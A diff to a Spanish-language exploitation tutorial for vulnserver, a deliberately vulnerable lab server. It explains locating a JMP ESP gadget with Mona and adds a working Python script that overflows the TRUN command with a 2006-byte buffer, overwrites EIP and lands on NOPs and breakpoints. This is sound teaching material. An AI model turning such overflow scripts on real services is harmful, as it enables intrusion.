@@ -812,7 +812,7 @@ Al volver a ejecutar el binario vulnserver en Immunity una vez generados el arra
 
 ```
 
-!mona compare -f C:\Users\Jorge\Desktop\STACK-BUFFER-OVERFLOW-EXPLOITATION\mona\WorkingFolder\vulnserver\bytearray.bin -a 0114F9CC
+!mona compare -f C:\PATH\TO\mona\WorkingFolder\vulnserver\bytearray.bin -a 0114F9CC
 
 ```
 
@@ -832,7 +832,124 @@ En este caso aparecen muchos porque sólo hemos enviado el \x00. Si por ejemplo 
 
 ### 🦘 ***7.5. JMP ESP***
 
-Una vez sabemos qué bad chars no podemos incluir volvemos al tema del salto a direcciónes para la ejecución de instrucciones. 
+Una vez que el EIP está bajo control y se identifican los bad chars, el siguiente objetivo es redirigir la ejecución al shellcode.
+
+- ¿Por qué usar JMP ESP? El registro ESP apunta a la parte superior de la pila, donde se almacena el shellcode.
+
+- Al usar JMP ESP, la ejecución se puede dirigir directamente al shellcode ubicado en la pila.
+
+**El comando !mona jmp -r esp -cpb "\x00" :**
+
+- Busca en los módulos cargados instrucciones que redirijan la ejecución al registro ESP (por ejemplo JMP ESP, CALL ESP, o instrucciones equivalentes que salten a la pila).
+
+- _-cpb "\x00"_ le indica a Mona que filtre y no muestre direcciones cuya representación en bytes contenga el byte \x00 (es decir, evita direcciones que introducirían NULs si se ponen como return address).
+
+Como resultado se devuelve una **lista de direcciones útiles** (módulo, offset, bytes de la instrucción) que se pueden usar como retorno seguro para saltar al shellcode en la pila, excluyendo las que contienen los bad chars especificados.
+
+<img width="1829" height="196" alt="image" src="https://github.com/user-attachments/assets/60f04651-9293-4181-b269-bc8c59adddbf" />
+
+En la captura se muestran todas aquellas direcciones que se pueden utilizar y que contienen JMP ESP sin bad chars. Si hacemos doble clic sobre alguna de ellas nos redirige a la ventana del código ensamblador donde se encuentra la instrucción.
+
+<img width="294" height="78" alt="image" src="https://github.com/user-attachments/assets/dc79f5e9-868c-4e9a-9039-082cdf182a81" />
+
+Por lo tanto, si podemos sustituir el EIP por la dirección seleccionada que contiene JMP ESP podremos ejecutar el código introducido como payload en ESP.
+
+Para ello se puede hacer uso del siguiente script en Python. Este script envía como entrada a vulnserver un payload que sobrescribe el registro EIP con la dirección 0x625011AF en formato little endian (\xAF\x11\x50\x62) que contiene la instrucción en ensamblador _JMP ESP_ seguido de los caracteres iniciales para el desbordamiento y la dirección se envían una secuencia de NOPs y breakpoints para facilitar la depuración. 
+
+<details>
+<summary><b>Python Script JMP ESP</b></summary>
+
+```python
+
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 9999
+
+# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
+# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
+# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
+eip_overwrite = b'\xAF\x11\x50\x62'
+
+# Add a sequence of NOPs (0x90) followed by three INT3 (0xCC) breakpoints to help with debugging.
+nops_and_breakpoint = b'\x90' * 10 + b'\xCC' * 3
+
+# Offset is 2006. We are sending 2006 'A's followed by the address 0x625011AF, some NOPs, and breakpoints for debugging.
+buffer = b'A' * 2006 + eip_overwrite + nops_and_breakpoint
+
+# Command
+command = b'TRUN'
+command_magic = b' .'
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Receive the banner or welcome message from the server
+	banner = s.recv(1024).decode('utf-8')
+	print(f'Server> {banner}')
+
+	# JMP ESP
+	print('Exploit> Jump to ESP register')
+	jmp_esp = command + command_magic + buffer
+	s.send(jmp_esp)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash. No response will be received.')
+	try:
+		response = s.recv(1024).decode('utf-8')
+		print(f'Server> {response}')
+	except Exception as e:
+		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
+
+```
+
+</details>
+
+Esta vez al ejecutar vulnserver desde Immunity y ejecutar desde CMD el script se obtiene algo diferente a lo que se venía mostrando cuando se producía el desbordamiento del búfer.
+
+<img width="838" height="438" alt="image" src="https://github.com/user-attachments/assets/a627149a-39af-4bf0-b453-e1bba205a205" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
